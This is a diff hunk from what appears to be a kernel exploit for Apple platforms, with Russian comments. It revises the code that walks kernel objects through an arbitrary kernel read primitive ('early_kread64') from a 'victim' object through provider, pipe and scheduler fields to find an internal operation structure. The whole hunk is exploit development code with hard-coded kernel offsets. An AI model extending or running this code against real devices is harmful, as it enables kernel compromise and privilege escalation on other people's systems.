@@ -6787,21 +6787,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t vcE = kpM2TClientVA(r, isTable, victim, @"opcE-victim");
         uint64_t ucE = kpLooksLikeKernelPointer(vcE) ? kp_untag_ptr(early_kread64(vcE + 0x30)) : 0;
         uint64_t provE = kpLooksLikeKernelPointer(ucE) ? kp_untag_ptr(early_kread64(ucE + 0xe8)) : 0;
-        // 1.9.232: массивы на SCHEDULER'е ([prov+0xb8]), не на prov (старый оракул
-        // 1.9.147 именно там их находил); матч по credit=0x10 ([op+0xc38] hi32 —
-        // доказано оракулом), UC back-ref вторым критерием; дамп counts при промахе.
+        // 1.9.233: scheduler = [pipe+0xb8] (записка р.39 в коде + P2-коммент —
+        // я ходил на [prov+0xb8], schedE=0 → op=0). Pipe через pipeMask
+        // [prov+0x180] → [prov+0x140+idx*8]; массивы sched+0xc8/+0x110, count
+        // sched+0xb8/+0x100. Матч credit=0x10 или UC back-ref.
         uint64_t schedE = 0;
         if (kpLooksLikeKernelPointer(provE) && kpSafeToRead(provE)) {
-            uint64_t c = kp_untag_ptr(early_kread64(provE + 0xb8));
-            uint64_t cnt0 = kpLooksLikeKernelPointer(c) ? early_kread64(c + 0xb8) : 0;
-            uint64_t a1 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0xc8)) : 0;
-            uint64_t a2 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0x110)) : 0;
-            if (kpLooksLikeKernelPointer(c) && cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = c;
-            else {
-                cnt0 = early_kread64(provE + 0xb8);
-                a1 = kp_untag_ptr(early_kread64(provE + 0xc8));
-                a2 = kp_untag_ptr(early_kread64(provE + 0x110));
-                if (cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = provE;
+            uint64_t maskE = early_kread64(provE + 0x180);
+            int pidxE = -1;
+            for (int b = 0; b < 8; b++) if (maskE & (1ULL << b)) { pidxE = b; break; }
+            uint64_t pipeE = (pidxE >= 0) ? kp_untag_ptr(early_kread64(provE + 0x140 + (uint64_t)pidxE * 8)) : 0;
+            if (kpLooksLikeKernelPointer(pipeE) && kpSafeToRead(pipeE)) {
+                uint64_t c = kp_untag_ptr(early_kread64(pipeE + 0xb8));
+                uint64_t cnt0 = kpLooksLikeKernelPointer(c) ? early_kread64(c + 0xb8) : 0;
+                uint64_t a1 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0xc8)) : 0;
+                uint64_t a2 = kpLooksLikeKernelPointer(c) ? kp_untag_ptr(early_kread64(c + 0x110)) : 0;
+                if (kpLooksLikeKernelPointer(c) && cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) schedE = c;
+                else schedE = pipeE;   // массивы могут быть и на самом pipe
             }
         }
         uint64_t opE = 0;
